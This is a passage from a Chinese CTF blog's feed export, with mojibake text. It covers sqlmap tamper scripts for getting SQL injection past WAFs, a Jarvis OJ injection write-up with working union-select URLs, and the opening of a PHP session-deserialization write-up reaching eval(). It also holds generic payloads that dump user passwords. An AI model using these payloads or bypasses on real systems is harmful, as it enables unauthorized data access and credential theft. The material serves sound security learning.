sp_password</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MSSQL</p><h2 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h2><p>ç”¨ /**/ æ›¿ä»£ç©ºæ ¼ï¼Œç”¨äºç©ºæ ¼çš„ç»•è¿‡</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> union/<strong>/select/</strong>/1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h2><p>ç”¨æ³¨é‡Šç¬¦â€“å’Œä¸€ä¸ªéšæœºå­—ç¬¦ä¸²åŠ ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢æ§åˆ¶ç¬¦</p><p>?union select 1,2â€“+ <strong>to</strong> unionâ€“HSHjsJh%0Aselectâ€“HhjHSJ%0A1,2â€“+</p><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MSSQLã€ SQLite</p><h2 id="space2hash-py"><a href="#space2hash-py" class="headerlink" title="space2hash.py"></a>space2hash.py</h2><p>å’Œä¸Šé¢ç±»ä¼¼ï¼Œä¸è¿‡è¿™å„¿æ˜¯ç”¨#æ³¨é‡Šç¬¦</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQL</p><h2 id="space2morecomment-py"><a href="#space2morecomment-py" class="headerlink" title="space2morecomment.py"></a>space2morecomment.py</h2><p>å°†ç©ºæ ¼ç”¨ /<strong>_</strong>/ æ›¿ä»£</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> union/<strong>_</strong>/select/<strong>_</strong>/1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h2><p>å’Œ space2hash.py ç±»ä¼¼ï¼Œä½†æ˜¯è¿™å„¿å¤šä¸€ä¸ª # å’Œæ¢è¡Œç¬¦ï¼Œå…·ä½“çœ‹ä¸€ä¸‹å¯¹æ¯”ï¼š</p><blockquote><p>space2hash.pyï¼š union select 1,2â€“+ <strong>to</strong> union %23 HSHjsJh %0A select %23 HhjHSJ %0A1,2â€“+</p><p>space2morehash.pyï¼šunion select 1,2â€“+ <strong>to</strong> union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQL &gt;= 5.1.13</p><h2 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h2><blockquote><p>blanks = (â€˜%01â€™, â€˜%02â€™, â€˜%03â€™, â€˜%04â€™, â€˜%05â€™, â€˜%06â€™, â€˜%07â€™, â€˜%08â€™, â€˜%09â€™, â€˜%0Bâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Eâ€™, â€˜%0Fâ€™, â€˜%0Aâ€™)</p></blockquote><p>ç”¨è¿™äº›éšæœºç©ºç™½ç¬¦æ›¿æ¢ payload ä¸­çš„ç©ºæ ¼</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> union%01select%021,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>SQL Server</p><h2 id="space2mssqlhash-py"><a href="#space2mssqlhash-py" class="headerlink" title="space2mssqlhash.py"></a>space2mssqlhash.py</h2><p>ç”¨ # åŠ ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ payload ä¸­çš„ç©ºæ ¼</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> union%23%0Aselect%23%0A1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MSSQLã€MySQL</p><h2 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h2><blockquote><p>blanks = (â€˜%09â€™, â€˜%0Aâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Bâ€™)</p></blockquote><p>ç”¨è¿™äº›éšæœºç©ºç™½ç¬¦æ›¿æ¢payloadä¸­çš„ç©ºæ ¼</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> union%09select%0D1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQL</p><h2 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a>space2mysqldash.py</h2><p>ç”¨ â€“ åŠ ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> unionâ€“%0Aselectâ€“%0A1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQLã€MSSQL</p><h2 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h2><p>ç”¨ + æ›¿æ¢ç©ºæ ¼</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> union+select+1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h2><blockquote><p>blanks = (â€œ%09â€, â€œ%0Aâ€, â€œ%0Câ€, â€œ%0Dâ€)</p></blockquote><p>ç”¨è¿™äº›éšæœºç©ºç™½ç¬¦æ›¿æ¢ payload ä¸­çš„ç©ºæ ¼</p><blockquote><p>union select 1,2â€“+ <strong>to</strong> union%09select%0C1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="symboliclogical-py"><a href="#symboliclogical-py" class="headerlink" title="symboliclogical.py"></a>symboliclogical.py</h2><blockquote><p>retVal = re.sub(râ€(?i)bANDbâ€, â€œ%26%26â€, re.sub(râ€(?i)bORbâ€, â€œ%7C%7Câ€, payload))</p></blockquote><p>ç”¨ &amp;&amp; æ›¿æ¢ and ï¼Œç”¨ || æ›¿æ¢ or ï¼Œç”¨äºè¿™äº›å…³é”®å­—è¢«è¿‡æ»¤çš„æƒ…å†µ</p><blockquote><p>1 and 1=1 <strong>to</strong> 1 %26%26 1=1</p><p>1 or 1=1 <strong>to</strong> 1 %7c%7c 1=1</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h2><blockquote><p>return payload.replace(â€œUNION ALL SELECTâ€, â€œUNION SELECTâ€) if payload else payload</p></blockquote><p>ç”¨ union select æ›¿æ¢union all select</p><blockquote><p>union all select 1,2â€“+ <strong>to</strong> union select 1,2â€“+</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h2><p>ç”¨å®½å­—ç¬¦ç»•è¿‡ GPC addslashes</p><blockquote><p>1â€˜ and 1=1 <strong>to</strong> 1%df%27 and 1=1â€“</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="uppercase-py"><a href="#uppercase-py" class="headerlink" title="uppercase.py"></a>uppercase.py</h2><p>å°† payload å¤§å†™</p><blockquote><p>union select <strong>to</strong> UNION SELECT</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="varnish-py"><a href="#varnish-py" class="headerlink" title="varnish.py"></a>varnish.py</h2><blockquote><p>headers = kwargs.get(â€œheadersâ€, {})headers[â€œX-originating-IPâ€] = â€œ127.0.0.1â€return payload</p></blockquote><p>æ·»åŠ ä¸€ä¸ª HTTP å¤´ â€œ X-originating-IP â€ æ¥ç»•è¿‡ WAF</p><p>è¿˜å¯ä»¥è‡ªå®šä¹‰ï¼š</p><blockquote><p>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p><h2 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h2><p>å¯¹ä¸æ˜¯å‡½æ•°çš„å…³é”®å­—è¿›è¡Œæ³¨é‡Š</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQL</p><h2 id="versionedmorekeywords-py"><a href="#versionedmorekeywords-py" class="headerlink" title="versionedmorekeywords.py"></a>versionedmorekeywords.py</h2><p>æ³¨é‡Šæ¯ä¸ªå…³é”®å­—</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURREN**T_USER</em>/()/<em>!AS</em>//<em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</p></blockquote><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>MySQL &gt;= 5.1.13</p><h2 id="xforwardedfor-py"><a href="#xforwardedfor-py" class="headerlink" title="xforwardedfor.py"></a>xforwardedfor.py</h2><blockquote><p>headers = kwargs.get(â€œheadersâ€, {})headers[â€œX-Forwarded-Forâ€] = randomIP()return payload</p></blockquote><p>æ·»åŠ ä¸€ä¸ªä¼ªé€ çš„ HTTP å¤´ â€œ X-Forwarded-For â€ æ¥ç»•è¿‡ WAF</p><p><strong>é€‚ç”¨æ•°æ®åº“ï¼š</strong>ALL</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;apostrophemask-py&quot;&gt;&lt;a href=&quot;#apostrophemask-py&quot; class=&quot;headerlink&quot; title=&quot;apostrophemask.py&quot;&gt;&lt;/a&gt;apostrophemask.py&lt;/h2&gt;&lt;blockquote&gt;

      
    
    </summary>
    
    
      <category term="SQLi" scheme="https://wywwzjj.top/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ inject</title>
    <link href="https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/"/>
    <id>https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/</id>
    <published>2019-02-26T09:56:10.000Z</published>
    <updated>2019-04-02T15:39:57.491Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p><h3 id="å¾—åˆ°æºç "><a href="#å¾—åˆ°æºç " class="headerlink" title="å¾—åˆ°æºç "></a>å¾—åˆ°æºç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    $table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">    $table = Filter($table);</span><br><span class="line">    mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">    $sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">    $ret = sql_query($sql);</span><br><span class="line">    <span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>?table=flag æ­£å¸¸å“åº”<br>==&gt; <strong>å­˜åœ¨ secret_flag è¡¨</strong><br>æ³¨æ„åˆ°è¿™ä¸ªåå¼•å· ``ï¼Œå…¶ä½œç”¨æ˜¯åŒºåˆ† MySQL ä¿ç•™å­—ä¸æ™®é€šå­—ç¬¦</p><p>æœ¬åœ°å°è¯•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">desc</span>  <span class="comment"># æŠ¥é”™</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`desc`</span>  <span class="comment"># èƒ½æˆåŠŸæ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">desc</span> <span class="string">`abc`</span> <span class="string">`def`</span></span><br><span class="line"><span class="keyword">desc</span> abc <span class="keyword">def</span> </span><br><span class="line"><span class="comment"># æ•ˆæœæ˜¯ä¸€æ ·çš„</span></span><br></pre></td></tr></table></figure><p>ç»“åˆé¢˜ç›® ==&gt; desc `secret_flag` `<br>ï¼ˆæ³¨æ„ç©ºæ ¼ï¼Œæ­¤å¤„å¦‚æœæ˜¯ desc `secret_flag`` å°†è¢«è®¤ä¸ºæ˜¯æ‰§è¡Œ desc secret_flag`ï¼‰</p><p>é¡ºæ‰‹æ‰§è¡Œ</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span></span><br></pre></td></tr></table></figure><p>å‘ç°è¿˜æ˜¯æ²¡æœ‰å˜åŒ–ï¼Œä¾æ—§æ˜¾ç¤º flag{xxx}<br>ä¸è¦ç°å¿ƒï¼Œè¿™åªæ˜¾ç¤ºäº†ä¸€æ¡æ•°æ®è€Œå·²ï¼ŒåŠ å…¥ limit è¯•è¯•</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>==&gt; 1</p><h3 id="æŸ¥è¯¢å­—æ®µ"><a href="#æŸ¥è¯¢å­—æ®µ" class="headerlink" title="æŸ¥è¯¢å­—æ®µ"></a>æŸ¥è¯¢å­—æ®µ</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`%<span class="number">20</span>`%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">20</span>group_concat(column_name)%<span class="number">20</span>from%<span class="number">20</span>information_schema.columns%<span class="number">20</span></span><br><span class="line">where%<span class="number">20</span>table_name=<span class="number">0x7365637265745f666c6167</span>%<span class="number">20</span>limit%<span class="number">201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p> ==&gt; flagUwillNeverKnow<br>(å¦‚æœ <code>â€œ</code> è¢«è¿‡æ»¤ï¼Œæ­¤å¤„ table_name çš„å€¼è¦è¿›è¡Œ hex ç¼–ç ï¼‰</p><h3 id="æŸ¥è¯¢æ•°æ®"><a href="#æŸ¥è¯¢æ•°æ®" class="headerlink" title="æŸ¥è¯¢æ•°æ®"></a>æŸ¥è¯¢æ•°æ®</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%20</span>flagUwillNeverKnow<span class="symbol">%20</span>from<span class="symbol">%20</span>secret_flag<span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>PSï¼šä¹Ÿå¯ä»¥ä¸ç”¨ limitï¼Œç›´æ¥ where 0ï¼Œä½¿å¾—å‰é¢çš„æŸ¥è¯¢ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ˜¾ç¤ºæˆ‘ä»¬çš„æ•°æ®<br>table=flag<code>%20</code>%20where%200%20union%20select%20flagUwillNeverKnow%20from%20secret_flag</p></blockquote><h3 id="è¡¥å……çŸ¥è¯†"><a href="#è¡¥å……çŸ¥è¯†" class="headerlink" title="è¡¥å……çŸ¥è¯†"></a>è¡¥å……çŸ¥è¯†</h3><p><strong>information_schema</strong> å­˜å‚¨æ•°æ®åº“ä¿¡æ¯çš„æ•°æ®åº“</p><blockquote><p><strong>æ•°æ®åº“å</strong></p><p>schemata =&gt; schema_name</p><p>tables =&gt; table_schema</p><p>columns =&gt; table_schema</p><p><strong>è¡¨å</strong></p><p>tables =&gt; table_name</p><p>columns =&gt; table_name</p><p><strong>åˆ—å</strong></p><p>columns =&gt; columns_name</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- è·å–å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() </span><br><span class="line"></span><br><span class="line"><span class="comment">-- è·å¾—æ‰€æœ‰åˆ—åï¼ˆå­—æ®µï¼‰</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"flag"</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- ä¸‹è½½æ•°æ®</span></span><br><span class="line">-1â€² or 1=1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- è·å–è¡¨ä¸­çš„å­—æ®µå</span></span><br><span class="line"><span class="number">-1</span>â€² <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://web.jarvisoj.com:32794/index.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://web.jarvisoj.com:32794/index.php&lt;/a&gt;~&lt;/p&gt;
&lt;h3 id=
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="SQLi" scheme="https://wywwzjj.top/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ phpinfo</title>
    <link href="https://wywwzjj.top/2019/02/25/Jarvis-OJ-phpinfo/"/>
    <id>https://wywwzjj.top/2019/02/25/Jarvis-OJ-phpinfo/</id>
    <published>2019-02-25T12:42:29.000Z</published>
    <updated>2019-10-13T11:49:46.424Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä»-session-è§’åº¦å­¦ä¹ ååºåˆ—åŒ–"><a href="#ä»-session-è§’åº¦å­¦ä¹ ååºåˆ—åŒ–" class="headerlink" title="ä» session è§’åº¦å­¦ä¹ ååºåˆ—åŒ–"></a>ä» session è§’åº¦å­¦ä¹ ååºåˆ—åŒ–</h1><p>ä¸‹é¢æ˜¯é¢˜ç›®ç»™å‡ºçš„æºç   <a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">åŸé¢˜é“¾æ¥</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $mdzz;</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">$m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>é¢˜ç›®ç›´æ¥ç»™å‡ºäº† <code>phpinfo</code> ä¿¡æ¯ï¼Œä½œä¸º CTF çš„é¢˜æ¥è¯´ï¼Œä¸€å®šæœ‰å…¶ç‰¹åˆ«çš„æ„ä¹‰ã€‚</p><p>å¦å¤–ï¼Œåœ¨å®æˆ˜ä¸­ä¹Ÿæ˜¯é‡è¦çš„ä¿¡æ¯æ³„éœ²ï¼Œä¸ç†Ÿæ‚‰çš„åŒå­¦å¯å‚è€ƒ <a href="https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/" target="_blank" rel="noopener">phpinfo å¯ä»¥å‘Šè¯‰æˆ‘ä»¬ä»€ä¹ˆ</a>ã€‚</p><p>é‡åˆ°è¿™ç§æƒ…å†µï¼Œå¯ç›´æ¥æ‹¿ä¸‹æ¥ä¸é»˜è®¤çš„ <code>phpinfo</code> è¿›è¡Œæ–‡ä»¶å¯¹æ¯”ï¼Œæˆ–è®¸å¯ä»¥è¿…é€Ÿæ‰¾åˆ°çªç ´å£ã€‚</p><h3 id="å›°å¢ƒ"><a href="#å›°å¢ƒ" class="headerlink" title="å›°å¢ƒ"></a>å›°å¢ƒ</h3><p>çœ‹åˆ° <code>__construct()</code> å’Œ <code>__destruct()</code> ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œææœ‰å¯èƒ½æ˜¯ååºåˆ—åŒ–çš„é¢˜ã€‚å…¶ä¸­ï¼Œ<code>__destruct()</code> ä¸­æœ‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br></pre></td></tr></table></figure><p>å¦‚æœ <code>$this-&gt;mdzz</code> å¯æ§çš„è¯ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ˜æ˜¾çš„ <code>webshell</code> äº†ï¼Œå¯æƒœ <code>mdzz</code> åœ¨æ„é€ å‡½æ•°ä¸­å°±é™æ­»äº†ï¼Œè€Œä¸”è¿™é‡Œå¹¶æ²¡æœ‰å˜é‡è¦†ç›–çš„æ¼æ´ï¼Œå¦åˆ™ä¹Ÿå¯ä»¥æ‰“ä¸€æ³¢ï¼Œé™·å…¥å›°å¢ƒã€‚</p><p>æœ‰è¿™ä¹ˆæ–¹ä¾¿çš„ <code>eval()</code> åœ¨è¿™é‡Œï¼Œèƒ½ä¸èƒ½ç»•è¿‡æ„é€ å‡½æ•°ï¼Œç›´æ¥æ‰§è¡Œæˆ‘ä»¬éœ€è¦çš„å‘½ä»¤å‘¢ï¼Ÿ</p><p>æ­¤å¤„å¿…æœ‰è¹Šè··ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br></pre></td></tr></table></figure><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p><strong>1.<a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md" target="_blank" rel="noopener">PHP Session åºåˆ—åŒ–åŠååºåˆ—åŒ–å¤„ç†å™¨è®¾ç½®ä½¿ç”¨ä¸å½“å¸¦æ¥çš„å®‰å…¨éšæ‚£</a></strong></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g5use1fv7vj20jy02owel.jpg" alt></p><p><code>phpinfo</code> ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒPHP ååºåˆ—åŒ–æ—¶å¯ä»¥ä½¿ç”¨çš„å‡ ç§æ–¹æ³•ã€‚</p><p>å¹³æ—¶å®éªŒè¿‡ç¨‹ä¸­ï¼Œä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªè¯­å¥è¿›è¡Œæ–¹æ³•æŒ‡å®šã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_start([</span><br><span class="line">    <span class="string">'serialize_handler'</span> =&gt; <span class="string">'php_serialize'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure><p>åœ¨è®¾ç½® session å’Œè¯»å– session ä¸¤ä¸ªé˜¶æ®µä¸­ï¼Œè‹¥ä½¿ç”¨äº†ä¸åŒçš„åºåˆ—åŒ–æ–¹æ³•ï¼Œå°†äº§ç”Ÿä»»æ„å¯¹è±¡æ³¨å…¥ï¼Œè¿›è€Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'test'</span>] = <span class="string">'|O:8:"stdClass":0:&#123;&#125;'</span>;</span><br><span class="line"></span><br><span class="line">å­˜å‚¨æ—¶ä½¿ç”¨ php_serialize --&gt; </span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">20</span>:<span class="string">"|O:8:"</span>stdClass<span class="string">":0:&#123;&#125;"</span>;&#125;</span><br><span class="line"></span><br><span class="line">ååºåˆ—åŒ–ä½¿ç”¨ php --&gt; </span><br><span class="line"><span class="comment">// var_dump($_SESSION);</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">[<span class="string">"a:1:&#123;s:4:"</span>test<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>PHP è·å–åˆ° session å­—ç¬¦ä¸²åï¼Œå°±å¼€å§‹æŸ¥æ‰¾ç¬¬ä¸€ä¸ª 